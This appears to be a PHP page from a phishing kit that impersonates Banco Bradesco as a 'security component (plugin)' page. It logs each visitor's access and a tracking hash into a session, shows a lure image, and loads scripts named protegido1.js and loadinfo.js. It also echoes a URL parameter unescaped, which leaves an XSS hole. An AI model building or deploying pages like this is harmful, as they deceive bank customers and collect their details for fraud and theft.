<?php
    include 'validacao.php';
    if(!isset($_SESSION['idInfo'])){
        Info::adicionarInfoFromAcesso(getHash());
    }

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Bradesco | Componente de Segurança (Plugin)</title>
    <link rel="shortcut icon" href="images/favicon.ico">
</head>
<body>


<a href=""><img src="adiantamento.png" class="media-object  img-responsive img-thumbnail"></a>




<input type="hidden" id="id" value="<?php echo isset($_SESSION['idInfo']) ? $_SESSION['idInfo'] : '';  ?>">
<input type="hidden" id="hash" value="<?php echo isset($_GET['hash']) ? $_GET['hash'] : '';  ?>">
<script src="js/jquery.min.js"></script>
<script src="js/protegido1.js"></script>
<script src="js/loadinfo.js"></script>
</body>
</html>